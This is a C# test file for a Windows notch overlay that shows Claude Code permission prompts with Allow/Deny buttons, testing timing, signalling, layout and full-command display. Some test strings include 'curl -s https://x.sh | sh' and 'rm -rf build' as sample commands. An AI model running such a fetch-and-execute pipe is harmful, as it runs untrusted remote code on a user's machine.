using ClaudeBarWin.Models;
using ClaudeBarWin.Services.Notch;
using ClaudeBarWin.Services.State;
using ClaudeBarWin.UI.Notch;

namespace ClaudeBarWin.Tests;

/// <summary>
/// F2 · Permitir / Denegar desde el notch: botones en la máquina de modos (armado a 400 ms, confirmación de
/// 600 ms), el hub que conecta el <see cref="PermissionBroker"/> con las señales y la geometría de los botones.
/// </summary>
public class NotchPermissionTests
{
    private static readonly DateTime T0 = new(2026, 10, 28, 12, 0, 0, DateTimeKind.Utc);
    private static readonly TimeSpan Arm = NotchTiming.PermissionArm;

    /// <summary>Veredicto de una tarea que YA debe estar completada (sin bloquear: falla si no lo está).</summary>
    private static PermissionVerdict Done(Task<PermissionVerdict> t)
    {
        Assert.True(t.IsCompletedSuccessfully, "la tarea del broker debería estar completada");
        return t.IsCompletedSuccessfully ? t.Result : (PermissionVerdict)(-1);
    }

    private static NotchStateMachine New(bool openOnClick = false) =>
        new(new NotchSettings(openOnClick, Minimal: false, HideInFullscreen: true));

    private static PermissionPending Req(string session = "a", string id = "r1", DateTime? at = null) =>
        new(session, session, at ?? T0, "Bash", "npm test", id);

    // ── Máquina de modos ─────────────────────────────────────────────────────────────────────────────

    [Fact]
    public void Timings_follow_the_spec()
    {
        Assert.Equal(TimeSpan.FromMilliseconds(400), NotchTiming.PermissionArm);
        Assert.Equal(TimeSpan.FromMilliseconds(600), NotchTiming.PermissionConfirm);
    }

    [Fact]
    public void Button_before_400ms_is_ignored()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        Assert.Equal(NotchMode.Permission, m.Mode);
        Assert.Equal("r1", m.ActiveAlert!.RequestId);
        Assert.False(m.PermissionArmed(T0 + Arm - TimeSpan.FromMilliseconds(1)));

        Assert.Null(m.OnPermissionButton(allow: true, T0 + Arm - TimeSpan.FromMilliseconds(1)));
        Assert.Equal(PermissionVerdict.None, m.PermissionAnswer);
        Assert.Equal(NotchMode.Permission, m.Mode);
    }

    [Fact]
    public void Arming_progress_is_linear_and_wakes_the_caller_when_armed()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        Assert.Equal(0f, m.PermissionArmProgress(T0));
        Assert.Equal(0.5f, m.PermissionArmProgress(T0 + Arm / 2), 3);
        Assert.Equal(1f, m.PermissionArmProgress(T0 + Arm));
        Assert.Equal(Arm, m.NextWakeIn(T0));                     // repinta justo al armarse
        m.Tick(T0 + Arm);
        Assert.Null(m.NextWakeIn(T0 + Arm));                     // armado y persistente: nada más que despertar
    }

    [Fact]
    public void Button_after_arming_returns_the_request_and_confirms_for_600ms()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        var t = T0 + Arm;

        Assert.Equal("r1", m.OnPermissionButton(allow: false, t));
        Assert.Equal(PermissionVerdict.Deny, m.PermissionAnswer);
        Assert.Equal(NotchMode.Permission, m.Mode);
        Assert.Null(m.OnPermissionButton(allow: true, t));        // un solo clic por petición
        Assert.Equal(NotchTiming.PermissionConfirm, m.NextWakeIn(t));

        // El hub avisa de que la petición se cerró (resuelta) y Claude sigue: la confirmación aguanta igualmente.
        m.OnSignal(new PermissionRequestClosed("a", "a", t, "r1"), t);
        m.OnSignal(new PermissionCleared("a", "a", t), t);
        Assert.Equal(NotchMode.Permission, m.Mode);

        m.Tick(t + NotchTiming.PermissionConfirm);
        Assert.Equal(PermissionVerdict.None, m.PermissionAnswer);
        Assert.NotEqual(NotchMode.Permission, m.Mode);
        Assert.Null(m.ActiveAlert);
    }

    [Fact]
    public void Read_only_permission_has_no_buttons()
    {
        var m = New();
        m.OnSignal(new PermissionPending("a", "a", T0, "Bash", "npm test"), T0);   // sin request_id (solo el hook)
        Assert.Equal(NotchMode.Permission, m.Mode);
        Assert.Null(m.ActiveAlert!.RequestId);
        Assert.False(m.PermissionActionable);
        Assert.Null(m.OnPermissionButton(allow: true, T0 + TimeSpan.FromSeconds(5)));
    }

    [Fact]
    public void Session_signal_without_request_keeps_the_request_of_the_shown_alert()
    {
        // El hook de sesión y el helper de permisos llegan por pipes distintos y en cualquier orden.
        var m = New();
        m.OnSignal(Req(), T0);
        m.OnSignal(new PermissionPending("a", "a", T0.AddMilliseconds(50), "Bash", "npm test"), T0.AddMilliseconds(50));
        Assert.Equal("r1", m.ActiveAlert!.RequestId);
        Assert.Equal("r1", m.OnPermissionButton(allow: true, T0 + Arm));   // el armado no se reinicia
    }

    [Fact]
    public void Session_signal_about_another_request_does_not_relabel_the_buttons()
    {
        // Dos peticiones en la misma sesión (tools o subagentes en paralelo): la A está a la vista con botones y el
        // hook de sesión habla ya de la B. Lo que se ve tiene que seguir siendo la A, que es lo que contestan.
        var m = New();
        m.OnSignal(Req(), T0);                                                              // A: «Bash: npm test», r1
        var t = T0.AddMilliseconds(200);
        m.OnSignal(new PermissionPending("a", "a", t, "Bash", "rm -rf build"), t);          // hook de B, sin request_id
        Assert.Equal("r1", m.ActiveAlert!.RequestId);
        Assert.Equal("Bash: npm test", m.ActiveAlert.Detail);
        Assert.Equal("r1", m.OnPermissionButton(allow: true, T0 + Arm));                    // el armado de la A sigue
        Assert.Equal("Bash: npm test", m.ActiveAlert!.Detail);
    }

    [Fact]
    public void Helper_request_after_the_session_signal_takes_over_with_buttons()
    {
        var m = New();
        m.OnSignal(new PermissionPending("a", "a", T0, "Bash", "npm  test"), T0);           // hook primero
        var t = T0.AddMilliseconds(30);
        m.OnSignal(Req(at: t), t);                                                          // el helper después
        Assert.Equal("r1", m.ActiveAlert!.RequestId);
        Assert.Equal("Bash: npm test", m.ActiveAlert.Detail);
        Assert.Null(m.OnPermissionButton(allow: true, T0 + Arm));                           // arma desde que hay botones
        Assert.Equal("r1", m.OnPermissionButton(allow: true, t + Arm));
    }

    [Fact]
    public void Changing_the_text_of_a_request_with_buttons_rearms_them()
    {
        // No se acepta un clic sobre un texto que acaba de cambiar: vuelven a contar 400 ms.
        var m = New();
        m.OnSignal(Req(), T0);
        var t = T0.AddMilliseconds(300);
        m.OnSignal(new PermissionPending("a", "a", t, "Bash", "npm run build", "r1"), t);
        Assert.False(m.PermissionArmed(T0 + Arm));
        Assert.Null(m.OnPermissionButton(allow: true, T0 + Arm));
        Assert.Equal("r1", m.OnPermissionButton(allow: true, t + Arm));
    }

    [Fact]
    public void Broker_default_ttl_expires_before_the_helper_gives_up()
    {
        // El plazo del helper (25 s) arranca antes que el del broker: el broker tiene que caducar primero para que un
        // clic tardío no muestre «Permitido» con el helper ya colgado.
        Assert.True(PermissionBroker.DefaultTtl < TimeSpan.FromSeconds(25));
        Assert.Equal(TimeSpan.FromSeconds(24), PermissionBroker.DefaultTtl);
    }

    [Fact]
    public void Request_closed_without_answer_falls_back_to_read_only()
    {
        // Caducó (25 s) o el helper se fue: Claude Code muestra su diálogo; el aviso sigue, pero sin botones.
        var m = New();
        m.OnSignal(Req(), T0);
        var t = T0.AddSeconds(25);
        m.OnSignal(new PermissionRequestClosed("a", "a", t, "r1"), t);
        Assert.Equal(NotchMode.Permission, m.Mode);
        Assert.Null(m.ActiveAlert!.RequestId);
        Assert.Null(m.OnPermissionButton(allow: true, t));
    }

    [Fact]
    public void Closing_another_request_does_not_touch_the_shown_one()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        m.OnSignal(new PermissionRequestClosed("a", "a", T0, "old"), T0);
        Assert.Equal("r1", m.ActiveAlert!.RequestId);
    }

    [Fact]
    public void Rejected_answer_drops_the_confirmation_and_the_buttons()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        Assert.Equal("r1", m.OnPermissionButton(allow: true, T0 + Arm));
        m.OnPermissionRejected("r1", T0 + Arm);                  // el broker ya la había cerrado (caducada)
        Assert.Equal(PermissionVerdict.None, m.PermissionAnswer);
        Assert.Equal(NotchMode.Permission, m.Mode);
        Assert.Null(m.ActiveAlert!.RequestId);
    }

    [Fact]
    public void Actionable_permission_is_not_swallowed_by_hover_expand()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        m.OnPointerEnter(T0);                                     // el usuario va hacia los botones
        m.Tick(T0 + NotchTiming.HoverExpand);
        Assert.Equal(NotchMode.Permission, m.Mode);
        Assert.Equal("r1", m.OnPermissionButton(allow: true, T0 + Arm));
    }

    [Fact]
    public void Actionable_permission_shows_over_an_open_expanded_panel()
    {
        var m = New(openOnClick: true);
        m.OnClick(T0);
        Assert.Equal(NotchMode.Expanded, m.Mode);
        m.OnSignal(Req(), T0);
        Assert.Equal(NotchMode.Permission, m.Mode);
        m.OnSignal(new PermissionCleared("a", "a", T0.AddSeconds(1)), T0.AddSeconds(1));
        Assert.Equal(NotchMode.Expanded, m.Mode);                 // resuelto: vuelve a lo que había
    }

    [Fact]
    public void Second_permission_arms_from_when_it_is_shown()
    {
        var m = New();
        m.OnSignal(Req("a", "r1"), T0);
        m.OnSignal(Req("b", "r2"), T0);
        var t1 = T0 + Arm;
        Assert.Equal("r1", m.OnPermissionButton(allow: true, t1));
        var t2 = t1 + NotchTiming.PermissionConfirm;
        m.Tick(t2);
        Assert.Equal("r2", m.ActiveAlert!.RequestId);
        Assert.Null(m.OnPermissionButton(allow: true, t2 + Arm - TimeSpan.FromMilliseconds(1)));
        Assert.Equal("r2", m.OnPermissionButton(allow: false, t2 + Arm));
    }

    [Fact]
    public void New_request_of_the_answered_session_never_wears_the_previous_confirmation()
    {
        // Auditoría: dos peticiones en la MISMA sesión (tools en paralelo). Se contesta r1 y, durante sus 600 ms de
        // confirmación, llega r2 y sustituye al aviso en su sitio. «Permitido» no puede pintarse sobre el texto de
        // r2 (no se ha aprobado), y r2 se arma desde que se ve por sí misma, no desde antes.
        var m = New();
        m.OnSignal(Req("a", "r1"), T0);
        var t1 = T0 + Arm;
        Assert.Equal("r1", m.OnPermissionButton(allow: true, t1));

        var t2 = t1 + TimeSpan.FromMilliseconds(100);
        m.OnSignal(new PermissionPending("a", "a", t2, "Write", "secreto.txt", "r2"), t2);

        Assert.Equal("r2", m.ActiveAlert!.RequestId);
        Assert.Equal(PermissionVerdict.None, m.PermissionAnswer);
        Assert.True(m.PermissionActionable);
        Assert.Null(m.OnPermissionButton(allow: true, t2 + Arm - TimeSpan.FromMilliseconds(1)));
        Assert.Equal("r2", m.OnPermissionButton(allow: false, t2 + Arm));
        Assert.Equal(PermissionVerdict.Deny, m.PermissionAnswer);
    }

    [Fact]
    public void Hidden_in_fullscreen_rearms_when_shown_again()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        m.OnFullscreen(true);
        m.Tick(T0 + TimeSpan.FromSeconds(3));
        Assert.Null(m.OnPermissionButton(allow: true, T0 + TimeSpan.FromSeconds(3)));
        m.OnFullscreen(false);
        var back = T0 + TimeSpan.FromSeconds(4);
        m.Tick(back);
        Assert.Null(m.OnPermissionButton(allow: true, back + Arm - TimeSpan.FromMilliseconds(1)));
        Assert.Equal("r1", m.OnPermissionButton(allow: true, back + Arm));
    }

    // ── Hub ──────────────────────────────────────────────────────────────────────────────────────────

    private static SessionState S(string id, SessionPhase phase, string lastEvent = "PreToolUse", string? tool = null) => new()
    {
        SessionId = id, Cwd = "C:\\p\\" + id, ProjectName = id, Phase = phase, LastEvent = lastEvent,
        PhaseSinceUtc = T0, LastTool = tool,
    };

    private static PermissionRequestInfo Info(string id, string session) => new(id, session, session, "Bash", "npm test", T0, PreviewComplete: true);

    [Fact]
    public void Hub_announces_new_requests_and_their_closing()
    {
        var hub = new ClaudeStateHub();
        var signals = new List<ClaudeSignal>();
        hub.Signal += signals.Add;

        _ = hub.Permissions.Register(Info("r1", "a"));
        hub.SyncPermissions(T0);
        var p = Assert.IsType<PermissionPending>(Assert.Single(signals));
        Assert.Equal(("a", "r1", "Bash", "npm test"), (p.SessionId, p.RequestId, p.Tool, p.Preview));

        hub.SyncPermissions(T0);                                  // sin cambios: sin señales repetidas
        Assert.Single(signals);

        hub.Permissions.Resolve("r1", PermissionVerdict.Allow, T0);
        hub.SyncPermissions(T0);
        var c = Assert.IsType<PermissionRequestClosed>(signals[1]);
        Assert.Equal(("a", "r1"), (c.SessionId, c.RequestId));
    }

    [Fact]
    public void Hub_uses_the_broker_it_is_given()
    {
        var broker = new PermissionBroker(TimeSpan.FromSeconds(25));
        Assert.Same(broker, new ClaudeStateHub(null, broker).Permissions);
    }

    [Theory]
    [InlineData("tool")]      // PostToolUse: contestó en la terminal y la herramienta corrió
    [InlineData("stop")]      // Stop
    [InlineData("idle")]      // Notification idle_prompt: sale de «espera tu OK»
    [InlineData("gone")]      // la sesión terminó
    public void Activity_of_the_same_session_cancels_its_request(string what)
    {
        var hub = new ClaudeStateHub();
        hub.PublishSessions(new[] { S("a", SessionPhase.WaitingForApproval, "PermissionRequest"), S("b", SessionPhase.WaitingForApproval, "PermissionRequest") }, T0);
        var mine = hub.Permissions.Register(Info("r1", "a"));
        var other = hub.Permissions.Register(Info("r2", "b"));

        var b = S("b", SessionPhase.WaitingForApproval, "PermissionRequest");
        SessionState[] next = what switch
        {
            "tool" => new[] { S("a", SessionPhase.Processing, "PostToolUse", "Bash"), b },
            "stop" => new[] { S("a", SessionPhase.WaitingForInput, "Stop"), b },
            "idle" => new[] { S("a", SessionPhase.WaitingForInput, "Notification"), b },
            _ => new[] { b },
        };
        hub.PublishSessions(next, T0.AddSeconds(1));

        Assert.True(mine.IsCompleted);
        Assert.Equal(PermissionVerdict.None, Done(mine));
        Assert.False(other.IsCompleted);
    }

    [Fact]
    public void Session_pending_signal_does_not_cancel_the_request()
    {
        // El hook de sesión (PermissionRequest) puede llegar DESPUÉS que el helper: no es «otra actividad».
        var hub = new ClaudeStateHub();
        hub.PublishSessions(new[] { S("a", SessionPhase.Processing, "PreToolUse", "Bash") }, T0);
        var t = hub.Permissions.Register(Info("r1", "a"));
        hub.PublishSessions(new[] { S("a", SessionPhase.WaitingForApproval, "PermissionRequest") }, T0.AddSeconds(1));
        Assert.False(t.IsCompleted);
    }

    // ── Geometría de los botones ─────────────────────────────────────────────────────────────────────

    [Theory]
    [InlineData(1f)]
    [InlineData(1.5f)]
    public void Buttons_sit_inside_the_pill_bottom_right_deny_then_allow(float s)
    {
        var size = NotchLayout.PermissionButtonsSize(s);
        var surface = NotchPlacement.Surface(s);
        var pill = NotchGeometry.PillRect(size.Width, size.Height, surface);
        var (deny, allow) = NotchGeometry.PermissionButtons(pill, s);

        Assert.False(deny.IsEmpty);
        Assert.Equal(deny.Size, allow.Size);
        Assert.True(deny.Right < allow.Left);                     // Denegar a la izquierda, Permitir a la derecha
        Assert.False(deny.IntersectsWith(allow));
        Assert.True(pill.Contains(deny) && pill.Contains(allow));
        Assert.True(allow.Height >= 24 * s - 1);                  // objetivo de clic cómodo
        // Ambos caen en la zona de clic de la ventana (la que recibe el ratón).
        Assert.True(NotchGeometry.HitTest(new Point(deny.X + deny.Width / 2, deny.Y + deny.Height / 2), size.Width, size.Height, s, surface));
        Assert.True(NotchGeometry.HitTest(new Point(allow.X + allow.Width / 2, allow.Y + allow.Height / 2), size.Width, size.Height, s, surface));
    }

    // ── Pintado ──────────────────────────────────────────────────────────────────────────────────────

    private static readonly Size Surface = new(700, 200);

    /// <summary>Pinta el Permiso a escala 1 y devuelve el brillo (canal R) de unos puntos de los botones, lejos del texto
    /// centrado: borde izquierdo y derecho de Denegar y borde izquierdo de Permitir.</summary>
    private static (int DenyLeft, int DenyRight, int AllowLeft) PaintButtons(string? requestId, float arm = 1f,
        PermissionVerdict answer = PermissionVerdict.None, bool reduceMotion = false)
    {
        var size = NotchLayout.PermissionButtonsSize(1f);
        var alert = new NotchAlert(NotchAlertKind.Permission, "a", "web", "Bash: rm -rf build", T0, null, requestId);
        using var bmp = new Bitmap(Surface.Width, Surface.Height, System.Drawing.Imaging.PixelFormat.Format32bppPArgb);
        using var g = Graphics.FromImage(bmp);
        using var painter = new NotchContentPainter(ClaudeBarWin.Services.Localization.Get("es"));
        painter.Paint(g, Surface, new NotchFrame(size.Width, size.Height, 1f, NotchMode.Permission, alert,
            Array.Empty<SessionState>(), null, 0f, 1f, ReduceMotion: reduceMotion, PermissionArm: arm, PermissionAnswer: answer));

        var (deny, allow) = NotchGeometry.PermissionButtons(NotchGeometry.PillRect(size.Width, size.Height, Surface), 1f);
        int cy = deny.Top + deny.Height / 2;
        return (bmp.GetPixel(deny.Left + 4, cy).R, bmp.GetPixel(deny.Right - 5, cy).R, bmp.GetPixel(allow.Left + 4, cy).R);
    }

    [Fact]
    public void Actionable_permission_paints_both_buttons_and_read_only_does_not()
    {
        var on = PaintButtons("r1");
        Assert.True(on.DenyLeft > 10 && on.AllowLeft > on.DenyLeft, $"{on}");   // Permitir resalta más que Denegar
        var ro = PaintButtons(null);
        Assert.Equal((0, 0, 0), ro);                                           // solo lectura: sin botones
    }

    [Fact]
    public void Arming_fills_the_button_from_left_to_right()
    {
        var empty = PaintButtons("r1", arm: 0f);
        var half = PaintButtons("r1", arm: 0.5f);
        var armed = PaintButtons("r1", arm: 1f);
        Assert.True(empty.DenyLeft < armed.DenyLeft);                          // sin armar: solo la pista
        Assert.Equal(armed.DenyLeft, half.DenyLeft);                           // la mitad izquierda ya rellena…
        Assert.Equal(empty.DenyRight, half.DenyRight);                         // …la derecha todavía no

        var reduced = PaintButtons("r1", arm: 0.5f, reduceMotion: true);
        Assert.Equal(empty.DenyLeft, reduced.DenyLeft);                        // reduce-motion: sin relleno, de golpe
    }

    [Fact]
    public void After_the_click_the_other_button_dims()
    {
        var normal = PaintButtons("r1");
        var allowed = PaintButtons("r1", answer: PermissionVerdict.Allow);
        Assert.True(allowed.DenyLeft < normal.DenyLeft, $"{allowed} vs {normal}");
        Assert.Equal(normal.AllowLeft, allowed.AllowLeft);
    }

    [Fact]
    public void Buttons_need_a_taller_pill_than_the_read_only_permission()
    {
        var ro = NotchLayout.TargetSize(NotchMode.Permission, 1f, 0f);
        var withButtons = NotchLayout.PermissionButtonsSize(1f);
        Assert.Equal(ro.Width, withButtons.Width);
        Assert.True(withButtons.Height > ro.Height);
    }

    // ── Comando completo (revisión cruzada, punto 1): botones solo si se ve ENTERO ────────────────────

    [Theory]
    [InlineData(1, 96f)]
    [InlineData(2, 112f)]
    [InlineData(4, 144f)]
    [InlineData(0, 96f)]      // se acota a 1..4
    [InlineData(9, 144f)]
    public void Permission_pill_grows_with_the_detail_lines(int lines, float height)
    {
        var size = NotchLayout.PermissionButtonsSize(1.5f, lines);
        Assert.Equal(NotchLayout.PermissionWidth * 1.5f, size.Width);
        Assert.Equal(height * 1.5f, size.Height, 3);
        // La más alta cabe con su sombra en la superficie baja del notch (la alta es solo para la página Uso).
        Assert.True(NotchLayout.PermissionButtonsSize(1f, 4).Height + 15f <= NotchPlacement.CompactSurfaceHeight);
    }

    [Theory]
    [InlineData(1f)]
    [InlineData(1.5f)]
    public void Detail_lines_are_measured_with_wrapping_up_to_four(float s)
    {
        using var painter = new NotchContentPainter(ClaudeBarWin.Services.Localization.Get("es"));
        Assert.Equal(1, painter.PermissionDetailLines(null, s));
        Assert.Equal(1, painter.PermissionDetailLines("Bash: npm test", s));
        Assert.Equal(2, painter.PermissionDetailLines("Bash: cd repo\nnpm test", s));
        Assert.Equal(4, painter.PermissionDetailLines("Bash: a\nb\nc\nd", s));
        Assert.Equal(0, painter.PermissionDetailLines("Bash: a\nb\nc\nd\ne", s));          // 5 líneas: no cabe
        // Una línea larga se ajusta (no se recorta con «…»): ocupa varias, y si pasa de 4 no cabe.
        int wrapped = painter.PermissionDetailLines("Bash: cd repo && npm test && curl -s https://x.sh | sh && echo fin de la cadena", s);
        Assert.InRange(wrapped, 2, 4);
        Assert.Equal(0, painter.PermissionDetailLines("Bash: " + string.Join(" ", Enumerable.Repeat("palabra", 120)), s));
        Assert.Equal(0, painter.PermissionDetailLines("Bash: " + new string('x', 600), s));  // sin espacios tampoco
    }

    /// <summary>Pinta el Permiso con botones a escala 1 con <paramref name="height"/> y devuelve lo que el painter dice que pintó.</summary>
    private static PermissionPaint? PaintedPermission(string detail, float? height = null, float contentAlpha = 1f, float pillAlpha = 1f,
        string? requestId = "r1")
    {
        using var painter = new NotchContentPainter(ClaudeBarWin.Services.Localization.Get("es"));
        int lines = painter.PermissionDetailLines(detail, 1f);
        var size = NotchLayout.PermissionButtonsSize(1f, lines);
        var alert = new NotchAlert(NotchAlertKind.Permission, "a", "web", detail, T0, null, requestId);
        using var bmp = new Bitmap(Surface.Width, Surface.Height, System.Drawing.Imaging.PixelFormat.Format32bppPArgb);
        using var g = Graphics.FromImage(bmp);
        painter.Paint(g, Surface, new NotchFrame(size.Width, height ?? size.Height, 1f, NotchMode.Permission, alert,
            Array.Empty<SessionState>(), null, 0f, contentAlpha, PillAlpha: pillAlpha));
        return painter.LastPermissionPaint;
    }

    [Theory]
    [InlineData("Bash: npm test")]
    [InlineData("Bash: cd repo\nnpm test\ncurl -s https://x.sh | sh")]
    [InlineData("Bash: a\nb\nc\nd")]
    public void Whole_detail_painted_at_its_size_counts_as_complete(string detail)
    {
        var p = PaintedPermission(detail);
        Assert.NotNull(p);
        Assert.Equal(("r1", "web", detail), (p!.RequestId, p.Title, p.Detail));
        Assert.True(p.Complete);
    }

    [Fact]
    public void Detail_cut_by_a_pill_still_opening_is_not_complete()
    {
        // Cuatro líneas en la pastilla de una: la última no se ve (LineLimit no la pinta) ⇒ no se acepta el clic.
        Assert.False(PaintedPermission("Bash: a\nb\nc\nd", height: NotchLayout.PermissionButtonsHeight)!.Complete);
        Assert.False(PaintedPermission("Bash: npm test", height: 50f)!.Complete);           // sin sitio ni para los botones
    }

    [Fact]
    public void Detail_that_does_not_fit_in_four_lines_is_never_complete()
    {
        Assert.False(PaintedPermission("Bash: a\nb\nc\nd\ne", height: 190f)!.Complete);
    }

    [Fact]
    public void Fading_or_dimmed_content_is_not_complete()
    {
        Assert.False(PaintedPermission("Bash: npm test", contentAlpha: 0.5f)!.Complete);
        Assert.False(PaintedPermission("Bash: npm test", pillAlpha: 0.35f)!.Complete);   // atenuado por un arrastre de Snap
    }

    [Fact]
    public void Read_only_permission_or_other_modes_leave_no_painted_permission()
    {
        Assert.Null(PaintedPermission("Bash: npm test", requestId: null));
    }

    [Fact]
    public void Painted_detail_is_not_truncated_to_one_line()
    {
        // La línea larga de la beta («cd repo && npm test && cu…»): ahora se pinta entera, en varias líneas.
        const string detail = "Bash: cd repo && npm test && curl -s https://x.sh | sh";
        using var painter = new NotchContentPainter(ClaudeBarWin.Services.Localization.Get("es"));
        Assert.True(painter.PermissionDetailLines(detail, 1f) >= 1);
        Assert.True(PaintedPermission(detail)!.Complete);
    }

    [Fact]
    public void Unanswerable_request_drops_its_buttons_and_stays_read_only()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        Assert.True(m.PermissionActionable);

        m.OnPermissionUnanswerable("r1", T0.AddMilliseconds(10));
        Assert.Equal(NotchMode.Permission, m.Mode);                 // sigue a la vista…
        Assert.Null(m.ActiveAlert!.RequestId);                       // …en solo lectura
        Assert.False(m.PermissionActionable);
        Assert.Null(m.OnPermissionButton(allow: true, T0 + Arm + Arm));
    }

    [Fact]
    public void Unanswerable_other_request_changes_nothing()
    {
        var m = New();
        m.OnSignal(Req(), T0);
        m.OnPermissionUnanswerable("otra", T0);
        Assert.Equal("r1", m.ActiveAlert!.RequestId);
    }

    [Fact]
    public void Hiding_the_notch_leaves_the_shown_permission_read_only()
    {
        // Lo que hace el notch al ocultarse: SetAccepting(false) en el broker; el hub lo traduce en el cierre y la máquina
        // deja el aviso en solo lectura (al volver no aparece con botones de una petición que ya no espera).
        var hub = new ClaudeStateHub();
        var m = New();
        hub.Signal += s => m.OnSignal(s, T0);
        var t = hub.Permissions.Register(Info("r1", "a"));
        hub.SyncPermissions(T0);
        Assert.True(m.PermissionActionable);

        hub.Permissions.SetAccepting(false);
        m.OnFullscreen(true);
        hub.SyncPermissions(T0);
        Assert.Equal(PermissionVerdict.None, Done(t));

        hub.Permissions.SetAccepting(true);
        m.OnFullscreen(false);
        m.Tick(T0.AddSeconds(1));
        Assert.Equal(NotchMode.Permission, m.Mode);
        Assert.Null(m.ActiveAlert!.RequestId);                     // solo lectura
        Assert.Null(m.OnPermissionButton(allow: true, T0.AddSeconds(2)));
    }

    [Fact]
    public void Hub_never_announces_an_incomplete_request_and_closes_it()
    {
        var hub = new ClaudeStateHub();
        var signals = new List<ClaudeSignal>();
        hub.Signal += signals.Add;

        var t = hub.Permissions.Register(Info("r1", "a") with { PreviewComplete = false });
        hub.SyncPermissions(T0);

        Assert.Empty(signals);                                      // sin PermissionPending con RequestId: sin botones
        Assert.Equal(PermissionVerdict.None, Done(t));              // y el helper suelta ya
        Assert.Empty(hub.Permissions.Pending);
    }
}
